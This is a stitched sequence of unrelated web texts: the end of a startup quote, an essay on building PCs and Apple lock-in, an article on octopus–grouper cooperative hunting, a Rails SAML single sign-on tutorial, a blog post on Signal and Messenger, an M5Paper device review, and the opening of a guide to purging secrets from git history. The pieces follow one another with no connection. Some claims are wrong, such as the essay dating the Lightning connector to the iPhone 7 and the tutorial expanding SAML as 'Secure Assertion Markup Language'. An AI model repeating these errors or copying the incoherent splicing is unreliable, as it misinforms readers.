benefit to getting plugged in with folks who share the mission around a belief that America needs to really think hard about how we innovate and how the private sector contributes. It’s about finding that kindred spirit, people who share that mission, who you can connect with. It's not just about building a company, but it's about supporting our country and supporting a peaceful and prosperous world.”</p><p>‍</p><p><em>Photo: Learn to Win CEO Andrew Powell and COO Sasha Seymore.

    <section>
      <p>I’ve long felt the same way about personal computers that Matt Crawford feels about cars: &nbsp;it is important to build your own PC so that you can have more control over a technology that you use every day.</p><p>I have been building my own PCs since the mid-1990s, when I put together my first machine using a NexGen Intel-clone processor. &nbsp;Since then I have not bought a whole PC; when I want better performance, I simply add more memory, put in new hard disks, upgrade the graphics card, or swap out the motherboard and CPU.</p><p>Windows-based computers are not hard to build. &nbsp;You just buy the parts—motherboard, CPU, memory, disk storage, a case, monitor and graphics card, and plug them together. &nbsp;There are a number of little tricks you learn along the way, like properly seating the cooling fan on top of the microprocessor, or inserting the memory sticks into their sockets the right way. &nbsp;But PCs are highly modular and standardized, and the standards don’t shift that often—from SCSI connectors to SATA, or from DDR3 to DDR4, or DVI to DisplayPort to connect the monitor. &nbsp;You just need to keep straight what the current standards are, and buy accordingly.</p><figure><img src="https://www.americanpurpose.com/content/images/2021/01/IMG_4043.jpg" alt="" srcset="https://www.americanpurpose.com/content/images/size/w600/2021/01/IMG_4043.jpg 600w, https://www.americanpurpose.com/content/images/size/w1000/2021/01/IMG_4043.jpg 1000w, https://www.americanpurpose.com/content/images/size/w1600/2021/01/IMG_4043.jpg 1600w, https://www.americanpurpose.com/content/images/2021/01/IMG_4043.jpg 2016w" sizes="(min-width: 720px) 720px"><figcaption>Getting ready for a build</figcaption></figure><p>Building your own machine has quite a number of advantages. &nbsp;You can customize them to exactly the uses you intend. Not everyone is a gamer who requires a humongous 16GB graphics card. &nbsp;You can get away with a rather modest machine if you’re just trying to create a home entertainment system. &nbsp;You can put your computer in a nice case that will fit easily on your desk. Recently I’ve taken to using a $50 Raspberry Pi-based computer to read the newspaper in the morning. &nbsp;In recent years AMD has pulled ahead of Intel in the CPU wars; why not shift over to their chips? &nbsp;Maintenance is much easier: computers, like human beings, seldom fail as complete systems; rather, an individual component goes on the fritz and needs to be replaced. &nbsp;Because something has failed on your motherboard does not mean you need to replace your keyboard, mouse, and monitor. &nbsp;If you have built your own machine, you can usually diagnose a problem down the road. &nbsp;For example, if you don’t hear the little “beep” when you turn it on, you know the machine has failed to post and that there’s something wrong with your BIOS. On the other hand, if it posts but hangs up when loading Windows, you suspect your copy of the operating system has been corrupted and needs to be reinstalled.</p><p>From the standpoint of someone who wants to maximize their technological autonomy, Apple computers are an absolute nightmare. &nbsp;Although I still own an Apple laptop, I seldom use it and definitely do not love my iPhone. &nbsp;Apple products were deliberately designed to prevent their users from modifying them, down to the use of proprietary fasteners that require special Apple-only tools. &nbsp;I tried to get into an old Mac laptop with my sons a few years ago; we ended up with a lot of useless bent metal trying to force our way in. &nbsp;Apple does not want you to be able to fix your own computer—rather, it wants you to visit the “Genius Bar” at the Apple Store and look over all the new products while you wait for someone to fix your machine in the back room. &nbsp;The “genius” refers not to you, the helpless customer, but to the marketing guy who thought up this system.</p><p>Apple is constantly making its users adopt proprietary connectors that you are forced to buy from them. &nbsp;An example is the “lightning” connector that was first introduced on the iPhone 7 and replaced the old 3.5mm headphone jack. &nbsp;Apple claims that this change was made to improve the user experience, but really they just want to force you to buy new headphones or adapters. &nbsp;They’ve similarly changed the plug on their power cords so often that you have to discard one from just a couple of years ago in favor of their most recent model. &nbsp;Landfills around the world are brimming with useless Apple power adapters.</p><p>Microsoft, as I well remember, tried to get away with something like this in the 1990s. &nbsp;The programming language Java had been created as a common, open standard that would operate across a variety of platforms—Macs, PCs, Linux, and so on. &nbsp;Microsoft then tried to “fork” the language and create a version that would only run on its own machines, which it could do because so many people used Windows PCs. &nbsp;This became part of the Justice Department’s decade-long antitrust suit against Microsoft, which in the end forced the latter to stand down.</p><p>You can only get away with this sort of behavior if you hold a near-monopolistic position in the marketplace, and the huge scale of tech companies like Apple, Google, Facebook, and Amazon has become a major challenge for our democracy. Unfortunately, after the Microsoft case, the U.S. stopped trying to enforce antitrust laws against Big Tech. This is a pattern that has only recently been reversed.</p><p>So learning to build your own computer reduces your acquisition costs, keeps down operating expenses, means that you can fix your machine when it breaks down on a weekend, and otherwise gives you the satisfaction of knowing exactly what’s under the hood of your computer. &nbsp;You’ve clawed back a little bit of personal autonomy.</p>

			<p><span>U</span>nder a coral ledge, a day octopus and a brown-marbled grouper meet. The grouper was there first, as if waiting, and they emerge together; the octopus zips ahead, skin turning from deep scarlet to purple-blue, and arrives at a boulder. Beneath the boulder is a hollow, a perfect hiding place for small prey. The octopus’s skin flickers and momentarily resembles the grouper’s own mottled scales before reverting to blue. They converge side-by-side in front of the hollow, seeming to consider it.</p> <p>Again the octopus’ skin mottles, and then again, the second time not much resembling the grouper’s patterns but rather a constellation of lights. The octopus swims to the boulder’s far side and makes a barrier with tentacles now spread flat and turned white. The grouper dives into the hollow, looking for fish whose escape routes have been blocked. Never mind the 500-million-year taxonomic gulf that separates them. Hunger, opportunity, and smarts cross that divide easily, hinting at adaptations that could help these unlikely partners navigate lean years ahead and providing an interspecies union to tickle human imaginations.</p> <p>“Crossing a phylum gap like this is almost like a human talking to a snail,” says Daniel Bayley, a marine biologist at University College London. “It’s amazing to watch.” Bayley and Amelia Rose of Oxford University observed octopuses working with brown-marbled grouper—and with peacock grouper and gold-saddle goatfish, too—in sunlit shallows off atolls in the northern Chagos Archipelago, a remote chain of islands in the Indian Ocean. The incidents caught their attention: While multispecies associations are not uncommon in the animal kingdom, it’s unusual to see such them between such different creatures. What’s more, this was a true collaboration.</p>  <figure><iframe width="733" height="412" src="https://www.youtube.com/embed/m7Ql6CPiGPw?c frameborder=" 0"="" allowfullscreen=""></iframe><figcaption><span>Daniel Bayley</span></figcaption></figure> <p>The animals were not merely taking advantage of the other’s activities, as happens when fish follow turtles across the seafloor, snapping up critters scattered by their sediment-disturbing foraging. They actively communicated with one another—not unlike <a href="https://www.nationalgeographic.com/animals/2020/02/coyote-badger-video-behavior-friends/" target="_blank">the coyote and badger</a> who starred in a viral video last year, with the coyote making a distinctive canine play bow to invite the badger along. There’s a lot of cognitive sophistication packed into such interactions.</p> <p>That octopuses would be involved is likely no surprise for people attuned to a cephalopod-celebrating <i>zeitgeist</i> inspired by books like Sy Montgomery’s best-selling <i>The Soul of an Octopus</i> and the wildly popular documentary <i>My Octopus Teacher</i>, which showed marvelous behaviors that had yet to be described scientifically: an octopus camouflaging herself with seashells, or playing with schools of fish. Popular footage likewise preceded description with octopus-grouper unions <a href="https://www.dailymail.co.uk/news/article-5072371/Blue-Planet-fish-octopus-clever-chimps.html" target="_blank">featured in the <i>Blue Planet II</i></a> television series and in <a href="https://www.youtube.com/results?search_query=octopus++and+grouper" target="_blank">a handful of YouTube videos</a>. In the Chagos Archipelago, though, Bayley and Rose had the chance to observe the collaborations in detail.</p><blockquote><p>If you think about it, that’s like us speaking to fish.</p> </blockquote><p><a href="https://www.tandfonline.com/doi/full/10.1080/10236244.2020.1746658?scroll=top&amp;needAccess=true" target="_blank">As they recount in a study</a> published in the journal <i>Marine and Freshwater Behaviour and Physiology</i>, the researchers even started to decipher some of the signals. When octopuses preceded the hunt with what Bayley and Rose called a “pounce” gesture, engulfing corals with their mantle and turning white, it was their fish partners who ate. When instead octopuses made a “groping” gesture, inserting tentacles into a crack or crevice, it was their turn to dine. “It was very much a give-and-take scenario,” Bayley said. Other gestures and skin-pattern signals remain uninterpreted. (Bayley and Rose did not observe octopuses&nbsp;<a href="https://www.npr.org/2020/12/24/950143025/watch-octopuses-punch-fish-sometimes-for-no-apparent-reason" target="_blank">“punching” their partners</a>, as another team of researchers recently documented in the Red Sea.)<br></p> <p>Asked to review the footage, Culum Brown, a behavioral ecologist at Macquarie University who specializes in fish intelligence, said “they are clearly communicating with one another.” Brown, who agrees that the hunts are planned, is curious how about how they’re initiated. Do octopuses give the go-ahead? Or fish? And how are partners chosen? Brown pointed to research on groupers cooperating with moray eels to hunt. Those fish <a href="https://www.wired.com/?p=1534651" target="_blank">select the most competent eels</a>, demonstrating a collaborative sophistication once thought limited to humans and certain primates. He also noted that, while octopuses seemed to take the lead, the collaborations seen by Bayley and Rose demand quite a bit of intelligence from the fish as well.</p><div>

</div> <p>Bayley’s own specialty is coral reef ecology, and his curiosity is piqued by what the cooperation represents. Though scientists have studied the Chagos Archipelago for decades, he said, no record exists of octopuses and fish hunting together there. He suspects it’s a recent adaptation. In the last several years, climate change-induced coral die-offs have radically disrupted the reefs’ animal populations and changed their very topography. There is much less prey than before; fields of rubble are not ideal for ambush-style hunting tactics that once worked so well.</p> <p>“This could be driving this novel interaction where both fish and octopus are searching for food, but their individual hunting strategies are not best for this flattened environment that’s losing a lot of its structure,” Bayley explained. Partnerships with gold-saddle goatfish are also notable in that they are adapted to find prey buried in sediment. “It’s another skill set to bring in. It’s almost like the octopus is assembling a team with specialist skills,” said Bayley.</p> <p>Another fascinating question, he said, is how knowledge spreads of hunting strategies and mutually understood signals. Perhaps each participating octopus and fish works it out for themselves, through trial and error—or perhaps, following an initial breakthrough, knowledge spreads by observation or even active teaching. That would make it a cultural adaptation, a matter of accumulating knowledge passed between generations, an example of species surviving in a fast-changing world not because of some fortunate genetic mutation but because they are learning. This also suggests a potentially key role for grouper. Unlike day octopuses, who reach a ripe old age at 15 months, brown-marbled and peacock grouper can easily live 40 years or longer. They may be a living library for their short-lived partners.</p> <p>That the Chagos Archipelago is so remote and well-protected—commercial fishing is banned there—may also help these underwater cultures evolve and proliferate, Bayley said. Individuals who would otherwise spread their knowledge don’t end up on a dinner plate. Brown agreed, noting an emerging scientific literature on <a href="https://science.sciencemag.org/content/363/6431/1032.summary" target="_blank">the importance of animal culture to conservation</a> and also the hypothesis that a loss of culture has hindered the recovery of some populations from overfishing. “One of the explanations is that we’ve basically fished out the cultural information about where to forage, where to migrate, where the best breeding grounds are,” he said. “If you’re consistently removing the biggest, the oldest and wisest, from the population, then that information is lost.”</p> <p>That understanding adds new importance to halting overfishing, and also to curbing pollution and excessive underwater noise that can impair learning, in other parts of the ocean—and maybe the sheer wonder of watching octopuses and fish work together can help inspire people to take action. Brown, echoing Bayley, marveled at the cross-phylum communication. “If you think about it, that’s like us speaking to fish,” said Brown, who could not think of an example of humans communicating in such a sophisticated manner with either fish or cephalopods. The closest analogue is people and their dogs. “It’s pretty astonishing,” he said.</p>  <p><i>Brandon Keim (<a href="https://twitter.com/9brandon" target="_blank">Twitter</a> / <a href="https://www.instagram.com/9brandon/" target="_blank">Instagram</a>) is a science and nature journalist.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><img alt="rails saml abstract" src="https://d33wubrfki0l68.cloudfront.net/4e19e5a1a96df85fc6b0aedeb7ec10a2947d23e7/44b01/img/railssaml.jpg"><h3>SAML Background<a href="#saml-background" title="Direct link to heading">#</a></h3><p>SAML SSO refers to an authentication mechanism preferred by enterprise companies. The SSO part stands for Single Sign-On. From the enterprise’s perspective, they desire a centralized service where their employees can authenticate, which then provides authenticated access to the applications they use for work. These services are called Identity Providers (IDPs), and they are the <em>Single</em> place where enterprise employees <em>Sign-On.</em> This is an alternative to employees using password-based authentication for each of the various applications they use.</p><p>The SAML part stands for Secure Assertion Markup Language. SAML utilizes a domain-specific flavor of XML that describes an authenticated user, encoded to a string and passed to your application in a query parameter. Your application decodes the <code>SAMLResponse</code> using a key that the enterprise provides to you.</p><p>The details of the SAML Response are less important than understanding the general flow. When a user wants to sign in using SAML, you must send that user to their Identity Provider with a <code>SAMLRequest</code> that identifies your application. The user signs in to their IDP, and is redirected back to you with the <code>SAMLResponse</code>. What makes this a tiny bit complicated for a multi-tenant application is routing the user to the correct IDP, as SAML SSO breaks our common understanding of a login flow.</p><p>A typical login screen might have an email and password field, then a few buttons to sign in with OAuth services, like Google or GitHub. But now, you’ll need to gather something from the user who wants to sign in such that you can send them to the correct IDP instance.  We like to say that SAML is <em>instance based</em>, especially when <a href="https://ossoapp.com/blog/saml-vs-oauth">compared to OAuth</a>, which we can think of as <em>class based</em>. Domain is a common key for this process - you can ask a user for their email, grab the domain, and use that as a key to find the correct IDP instance and redirect the user.</p><h3>Let’s Build and Iterate<a href="#lets-build-and-iterate" title="Direct link to heading">#</a></h3><p>Once you wrap your head around understanding the SAML flow, it’s really not challenging to implement SAML in a Rails app - IDPs themselves offer great open source libraries to help with your integration. You can definitely get very far in a day or two. But like most things in engineering, the last 10% can take 90% of the effort, and while we all love to say “I could build that in a weekend,” we often later eat our words when we realize all of the edge cases, documentation needs, scaling challenges and unknown unknowns that make this or any other project worth doing a bit more involved than a quick weekend hack.</p><p>I’m a co-founder of an open source company Osso - our microservice is a Ruby and React app that allows you to onboard SAML SSO customers, generates custom documentation for each customer to perform their onboarding tasks in their IDP, and allows your Rails app to consume Osso using OAuth - we even provide <code>omniauth-osso</code> to make consuming an Osso instance from your Rails app incredibly simple.</p><p>Osso also offers paid plans, and you can skip right to our <a href="https://ossoapp.com/pricing">pricing page</a> to learn more about hosted Osso if you need SAML yesterday. Or you can jump right in to <a href="https://ossoapp.com/docs/deploy/overview">deploying an open source Osso instance</a> from our GitHub repo. There’s certainly the possibility of using <code>osso-rb</code> in your Rails app directly — you’ll want to mount our 3 rack based apps, pull in migrations, etc. — but this post will focus instead on a microservices approach.</p><p><strong>So</strong>, if you’d like to begin from first principles, follow along here as we build up a production-ready SAML SSO integration, starting with a single tenant approach, then layering in multi-tenancy. Once we have multi-tenant support, we’ll address questions about scalability and serviceability — how can we repeatedly add additional tenants, without spending significant engineering or customer support cycles? I <em>will</em> encourage you to use Osso, and show you exactly how, but will also highlight the things you need to be considering in order to roll out a production ready SAML integration <em>without</em> Osso.</p><p>We’ll use a single Rails app repository throughout this tutorial. The <a href="https://github.com/enterprise-oss/saml-rails" target="_blank" rel="noopener noreferrer">main branch</a> is a barebones Rails 6 app with Devise and a User model, and for each of our steps below we’ll move to a feature branch so we can see a full diff. Each step adds more functionality, getting you closer to a production-ready, multi-tenant integration. Each step also uses open source software, where the library used in the previous step is a dependency of the next step’s library. Neat!</p><p>We’ll also make use of Osso’s <a href="https://github.com/enterprise-oss/sinatra-ruby-idp" target="_blank" rel="noopener noreferrer">mock IDP</a> and <a href="https://demo.ossoapp.com/" target="_blank" rel="noopener noreferrer">demo instance</a>, especially when we get into multi-tenancy. You’ll still want to register with an IDP for a developer account in order to have access to an IDP for a second tenant - we recommend an <a href="https://developer.okta.com/signup/" target="_blank" rel="noopener noreferrer">Okta developer account</a>.</p><h3>Base Rails application<a href="#base-rails-application" title="Direct link to heading">#</a></h3><p>We’ll use the same Rails 6 application for each step - the source code is available [here] (<a href="https://github.com/enterprise-oss/saml-rails" target="_blank" rel="noopener noreferrer">https://github.com/enterprise-oss/saml-rails</a>). The <code>main</code> branch adds Devise with a User model to a brand new Rails app using Postgres as the database. The application doesn’t do anything - there is an index route and a logged in route that will tell you the email for the current user. This guide assumes proficiency with Rails, so it will skip some details. We’ll also use some intentionally naive approaches to demonstrate common challenges of SAML SSO. </p><h3>Single tenant<a href="#single-tenant" title="Direct link to heading">#</a></h3><h4>With ruby-saml and mock IDP<a href="#with-ruby-saml-and-mock-idp" title="Direct link to heading">#</a></h4><p>My first experience with SAML was working on <a href="https://medium.com/@tsharon/democratizing-ux-670b95fbc07f" target="_blank" rel="noopener noreferrer">internal software at WeWork</a> where one of my Osso co-founders was a teammate. The IT department required us to use SAML SSO, which I at first was awfully annoyed by. Google OAuth was super easy, and could be restricted to domain, so what’s the deal with this OneLogin thing? Fortunately, single-tenant SAML was just as simple to implement, and admittedly did include some better security. This is a common situation — an enterprise company requires SAML, and it might seem silly to you, but them’s the rules.</p><p>Our project was a Rails app, and we used a Ruby gem from OneLogin to handle the actual SAML encoding and decoding. Since we were building this app for WeWork employees, we had a single tenant, and didn’t need to worry about implementing a scalable solution for multiple tenants, documenting how to set SAML up for the app or training our teammates on how it worked. We also didn’t need to change our login form - we knew every user would be sent to the same IDP instance, so we were able to use a simple <em>Sign in With OneLogin</em> button.</p><p>That’s what we’ll do here, and if you’re building internal software this will be a fine approach for your production release! We’ll use Osso’s mock IDP for this single tenant to keep things simple too.</p><p>First lets install the ruby-saml gem. We’ll include it in our Gemfile and run <code>$ bundle install</code>.</p><p>We’ll use this library in two ways:</p><p>First, when a user wishes to sign in with SAML, we use ruby-saml to generate a url with a <code>SAMLRequest</code> - the URL is where we will send the user to sign in, and the <code>SAMLRequest</code> is sent along as a query param in order to identify our application to the IDP.</p><p>When the user signs in to their IDP, they will be sent back to your application with a <code>SAMLResponse</code> query param. We then use ruby-saml to decode and validate the <code>SAMLResponse</code>, allowing us to access information describing the user, such as their email address.</p><p>Lets define a couple of routes and controller actions to handle this flow.</p><p>In the <code>saml_login</code> action, we create a <code>OneLogin::RubySaml::Authrequest</code> and redirect to the return value. Later, in the callback, we validate and decode the response, and will sign the user in and redirect them if valid. Otherwise we’ll raise the validation errors to understand where our SAML config went wrong.</p><p>This callback route will also need to accept a POST request with <code>www-url-form-encoded</code> parameters, so you will need to skip the Rails <code>verify_authenticity_token</code> <code>before_action</code>:</p><div><p>app/controllers/application_controller.rb</p></div><p>Both of these actions depend on what ruby-saml calls <code>settings</code>. These values are created via the configuration you must perform between your application and the Identity Provider. In a real-world example, your application generates a few values which you provide to your customer. The customer uses these to configure your application in their IDP and returns some data generated by the IDP. We’ll discuss this process in more detail later. Since we are using the Osso Mock IDP we can mostly skip this configuration step, but it’s worth understanding what each of these values represents, how it functions and why it might prevent your user from signing in if misconfigured.</p><p>Each of the controller actions above calls a private method <code>saml_settings</code>. Since we are dealing with a single tenant, we will essentially hardcode the SAML configuration values to support this one IDP instance.</p><div><p>app/controllers/application_controller.rb</p></div><p><strong>Values you provide</strong></p><p><strong>ACS URL</strong> - The Assertion Consumer Service URL is where the IDP will send the user with a SAMLResponse when they log in. Similar to a Redirect URI in OAuth, your application will generate this value according to how your routes are set up.</p><p><strong>SP Entity ID</strong>  - Sometimes called the Audience URI, this is a unique identifier for the tenant in your application. This can get hairy! <strong>Google</strong> requires that they be unique for a customer, so you can't just use domain, while <strong>Azure</strong> won't let you use a UUID and <strong>Ping</strong> won't let you use a url. Those are just <em>some</em> of the edge cases we've found!</p><p><strong>Values the IDP provides</strong></p><p><strong>IDP SSO Target URL</strong> - The single sign on target URL tells your application where to send a user with a <code>SAMLRequest</code> in order to sign in.</p><p><strong>IDP Certificate</strong> - An x509 certificate which includes a public key that your application uses to encode and decode the SAML request and response.</p><p>Since we are using the Mock IDP, these values can be found in the Mock IDP’s federated metadata: <a href="https://github.com/enterprise-oss/sinatra-ruby-idp/blob/main/metadata.xml" target="_blank" rel="noopener noreferrer">https://github.com/enterprise-oss/sinatra-ruby-idp/blob/main/metadata.xml</a></p><p>To enforce good security practices, we put the certificate in Rails credentials. We won't show you our whole certificate here, but here's part of an …</p></section></div>

In this way, nobody can use your conversations to sell your information to advertisers and no rogue government can read your messages to enforce laws. But for the average person living in a western democracy, who still (knowingly or unknowningly) uses Facebook and other ad-supported, privacy-invasive social networks, this feature is not as important as it seems.</p><p>Messenger, for me, is the best chat app in the world, because it has the only feature I need from a chat app. <strong>My contacts!</strong></p><p>If I want to contact somebody, I know that he will be there receiving my messages. This feature is enough for me to give up the promise of enchanced privacy.</p><p>It’s something different that should be more important.</p><h2 id="but-why-did-i-install-signal">But why did I install Signal?</h2><p>Although we feel that we can choose our chat service, the direct opposite happens. The best feature mainstream chat apps have, our contacts' usage of them, is the reason we are hostages to these applications. If we want to move to another chat application, we need to pursue all of our contacts to move. This is the great power Facebook is using irresponsibly.</p><p>This power is what takes away from us the right to choose who and why is using our data.</p><p>But more importantly, this power hinders innovation and progress. If a better chat application is released, then most people wouldn’t care to use it. That happens because it wouldn’t have the most important feature, their friends. Eventually, if this application is really better than the current offerings, the best features would be copied by the mainstream apps and the vicious cycle will continue.</p><p>Trying to go against this great power, I installed Signal. I chose Signal because it is in a way the direct opposite of what Facebook’s apps are. It is open-source, people can view and contribute to its code and it’s backed by a non-profit. It’s an app that implements changes based to what its community wants, it’s an app that can care about your opinion and your choices.</p><p><img src="https://chrispanag.com/posts/i-didnt-install-signal-for-privacy/signal-icon.jpg" alt="signal icon"></p><p>I immediately invited my closest contacts to join and… people joined, then agreed that this app is nice and afterwards nobody contacted me a second time through Signal. Everybody still used Messenger.</p><p>At the end, I completely understood their choice, or better, their <strong>lack of choice</strong>. If they wanted to keep in touch with their other friends, they still needed to use Messenger, and who wants to complicate their lives with multiple apps?</p><h2 id="at-the-end-what-can-we-do">At the end, what can we do?</h2><p>When the internet started proliferating, choice was one of its biggest advantages. We could choose the software we use, we could choose the services we access. But now, the massive social networks, with the power they have accumulated by our participation, have narrowed down our choices to the bare minimum.</p><p>The only way to change the situation is to force those social networks to use their powers more responsibly. Europe’s GDPR law with its <a href="https://www.privacypolicies.com/blog/gdpr-eight-user-rights/#6_The_Right_To_Data_Portability">right to data portability</a> is a step in the right direction, but it’s not enough. I believe we need more to regain our right to choose what services we use.</p><p>After portability, we need to discuss about <strong>interoperability</strong>, which in this case is the ability to contact people that are are using different chat applications than the one you are using. The way email and SMS already work.</p><p>Although this is still far-fetched, we need to finally start addressing it.</p><h2 id="further-reads">Further reads</h2><ul><li><a href="https://www.jeremydormitzer.com/blog/what-is-activitypub.html">What is ActivityPub?</a></li><li><a href="https://www.androidauthority.com/signal-app-1148147/">Signal: What is it and why is everyone talking about it?</a></li></ul><h2 id="how-do-you-feel-about-the-right-to-choice">How do you feel about the right to choice?</h2><p>I would love to discuss more about it in the comments.</p></div></div>]]>

<p>I’m pleased to say, that M5Stack did it again. They managed to release another ESP32 based product and keep me on my tosies! From incredible small Atom (review pending), through most feature-packed M5StickC (<a href="https://notenoughtech.com/review/m5stickc-plus/">review</a>) to power development Fire Kit Core  (<a href="https://notenoughtech.com/review/this-esp32-is-on-fire-m5stack-core/">review</a>) – each product brought joy to my eyes despite being basically the same: an ESP32 based all-in-one development board. And they did it again thanks to <a href="https://m5stack.com/products/m5paper-esp32-development-kit-960x540-4-7-eink-display-235-ppi">M5Paper</a> – a unique mashup between ESP32 and e-ink displays.</p>



<h2>M5Paper – phone-size wonder</h2>

<p>It’s not the first ESP32 &amp; e-ink display combo, but it’s the first one I really wanted to have. Convincing M5Stack to send me one wasn’t the problem. The device is so high in demand, that I had to wait till Xmas to get mine. It is not just me that likes the concept. M5Paper is in stock right now, but if you are unlucky, it also surfaces on <a href="https://www.banggood.com/custlink/mDvdSKZvLF">Banggood</a> and <a href="https://s.click.aliexpress.com/e/_Af1yn5">AliExpress</a>.</p>



<p>M5Paper nails the design thanks to 4.7-inch, 940*540 multitouch 16 level grayscale e-ink display. It’s not just an e-ink ESP32 module, it’s a well-thought-through product that deserves everyone’s attention.  The phone form factor feels great in my hand and lightning-fast (for an e-ink) display creates this PDA alike impression. </p>




<h3>Inside M5Paper</h3>



<p>While the device doesn’t make it difficult to peak inside, M5Paper isn’t designed to be opened and tinkered with. You won’t find any hidden pins or ways to interact with the board, but there is enough space to swap the LiPo battery for a bigger one, in case 1150mAh isn’t enough. And you get 3 Grove connectors to plug external sensors and other fun add-ons. </p>

<p>Under the hood, M5Paper comes with a very familiar ESP32 module surrounded by pretty decent hardware – just take a look at the specs:</p>



<figure><table><tbody><tr><td>SP32-D0WDQ6-V3</td><td>240MHz dual core, 600 DMIPS, 520KB SRAM, Wi-Fi, dual mode Bluetooth</td></tr><tr><td>Flash</td><td>16MB</td></tr><tr><td>PSRAM</td><td>8MB</td></tr><tr><td>Ports</td><td>TypeC*1, HY2.0-4P*3 , TF-card(microSD) slot</td></tr><tr><td>E-Ink Display</td><td>Model Number：EPD_ED047TC1 | 540*960@4.7″ | Grayscale : 16 Levels | Display area : 58.32*103.68mm | Display Driver : IT8951</td></tr><tr><td>Physical Button</td><td>Multi-function button*1 ， Reset Button*1</td></tr><tr><td>RTC</td><td>BM8563</td></tr></tbody></table></figure>



<p>It’s a very clever design to include BM8563 Real-Time Clock, as you can save a lot of power by using RTC to trigger the events rather than sleep policies of ESP32. Combined with the e-ink, M5Paper can last ages on a single charge. This is reinforced by the default firmware as well. The power button at the back of the device disables ESP32 when pressed and the “volume” rocker wakes it up when held for a couple of seconds. </p>




<h3>Putting “kindle” into M5Paper</h3>



<p>The device feels like a small-sized phone in the hand. It has just enough screen estate to break the development board impression and appear as intriguing “kindle” alike device. It’s not an e-reader, M5Paper is even more awesome. The display is simply perfect as far as e-inks go. 16 level greyscale enables images and advanced shading while multitouch (2-point) touchscreen is responsive enough, so I don’t hate using the onscreen keyboard. </p>

<p>Navigating through menus is fairly quick, and even though menus take 2-3 screen refresh cycles to fully materialise, you can quickly jump from screen to screen. Frankly speaking, I played with less responsive LCD screens in the past!</p>



<p>Just remember, there is no backlight. The device is perfectly visible in a full sunshine, but completely useless in the dark.</p>




<h3>The “I’m still all-in-one development board”</h3>



<p>It’s not the first take on e-ink display by M5Stack. They merged it before with their Core INK – an e-ink-equipped take on M5Stick series. Unlike <a href="https://m5stack.com/collections/m5-core/products/m5stack-esp32-core-ink-development-kit1-54-elnk-display?variant=37404426174636">Core INK</a>, M5Paper is missing one thing that I really liked – the ability to program the board in the web browser wirelessly. I can only hope that the support will be added soon, as programming M5Stack wirelessly feels like magic.</p>



<p>Update: 23/01/2021: Dev team from M5Stack had confirmed that integration for UIFlow is on the way, we should see M5Paper joining the UIFlow as well soon!</p>

<p>Just like other M5Stack devices, M5Paper supports Arduino IDE &amp; MicroPython. The product is fairly new, so it lacks in community projects, but the documentation explains basics and shows you how to handle an e-ink display with sample projects. Apart from online examples, M5Paper supports M5Stack Burner software. You can try community projects and easily reverse back to the default firmware.</p>

<p>Unless an e-ink is what you really want, I’d pick <a href="https://m5stack.com/collections/m5-core/products/m5stack-esp32-core-ink-development-kit1-54-elnk-display?variant=37404426174636">Core INK</a> series if you are getting started. M5Paper expects customers a bit of knowledge to take the advantage of the ESP32 inside. The demo panel promises interesting features, but to my disappointment, the “Home Automation” panel isn’t released as a source code, and I cannot integrate it with my house appliances. It’s a shame. </p>

<h2>Final Thoughts</h2>



<p>I’m a little disappointed that M5Paper isn’t compatible with UIFlow, I hope this will change with time. I do love the device and I’m already thinking about potential projects. If you feel comfortable with Arduino IDE programming, go for it. Hardware-wise, <a href="https://m5stack.com/collections/m5-core/products/m5paper-esp32-development-kit-960x540-4-7-eink-display-235-ppi">M5Paper</a> is an amazing device worth the money spent on it. But if you are getting started, expect a steeper learning curve, limited tutorial materials, perhaps, you would be better off with <a href="https://m5stack.com/collections/m5-core/products/m5stack-core2-esp32-iot-development-kit?variant=35960244109476">M5Stack Core 2 </a>or <a href="https://m5stack.com/collections/m5-core/products/m5stack-esp32-core-ink-development-kit1-54-elnk-display?variant=37404426174636">Core INK</a> instead. I will try to get my hands on both! If you have any questions, please let me know in this <a href="https://www.reddit.com/r/Not_Enough_Tech/comments/l2nh9n/m5paper_the_kindle_of_development_and_automation/">Reddit thread</a>.</p>

                    <p>You know that <a href="https://blog.gitguardian.com/secrets-credentials-api-git/">adding secrets to your git repository</a> (even a private one) is a bad idea, because doing so <strong>risks exposing confidential information to the world</strong>. But mistakes were made, and now you need to figure out how to excise confidential information from your repo. <strong>Because git keeps a history of <em>everything</em>, it’s not often enough to simply remove the secret, commit, and push</strong>: we might need to do a bit of deep cleaning.</p><p><strong>Thankfully, for simpler cases, git provides commands that make cleaning things up easy</strong>. And in more complicated cases, we can use git-filter-repo, a tool recommended by the core git developers for deep cleaning an entire repository.</p><p>First and foremost, if there is reason to think that the secret has escaped into the world, and you can revoke the secret, do so. How to revoke a secret is going to vary quite a lot depending on what the secret protects. If you don’t know how to revoke it, you will need help from the owner of the resource protected by the secret.</p><blockquote>Need to quickly see what scenario applies to you? <br>check out our cheatsheet flow chart below</blockquote><!--kg-card-begin: html--><p><a href="https://res.cloudinary.com/da8kiytlc/image/upload/v1611932656/Cheatsheets/RewritingYourGitHistory-Cheatsheet-Final_weq1l2.pdf" target="_blank"><img src="https://res.cloudinary.com/da8kiytlc/image/upload/c_scale,r_6,w_500/v1611932656/Cheatsheets/RewritingYourGitHistory-Cheatsheet-Final_weq1l2.png"></a></p><!--kg-card-end: html--><!--kg-card-begin: html--><p><a href="https://res.cloudinary.com/da8kiytlc/image/upload/v1611932656/Cheatsheets/RewritingYourGitHistory-Cheatsheet-Final_weq1l2.pdf" target="_blank">Download the git history cheatsheet</a></p><!--kg-card-end: html--><p>Now, let’s consider different scenarios to see how to clean things up.</p><h2 id="no">NO</h2><!--kg-card-begin: markdown--><p>No? That’s great. Please don’t push it up just yet.If you have any uncommited work, we can use <code>git stash</code> to save it. This sets your work aside in a temporary “stash” so that we can work with the git repository without losing anything you haven’t committed yet. When we’re done cleaning things up, you can use <code>git stash pop</code> to restore your work.</p>
<!--kg-card-end: markdown--><h2 id="yes">YES</h2><p>If you have already pushed a commit containing a secret, or just discovered a secret in your existing history, things get more complicated if there are other people working on this branch. If you work alone, there’s nothing to do at this point, you can skip to the next step. If you work as part of a team, things get more complicated because we need everyone to act in a coordinated way.</p><!--kg-card-begin: markdown--><p>First of all, we need to determine who else is affected by the secret’s presence, because we’ll need to coordinate everyone’s actions. If the secret only appears in the branch you’re working on, you only need to coordinate with anyone else who is always working off of that branch. However, if you found the secret lurking further back in git history, perhaps in your <code>master</code> or <code>main</code> branch, you’ll need to coordinate with everyone working in the repository.</p>
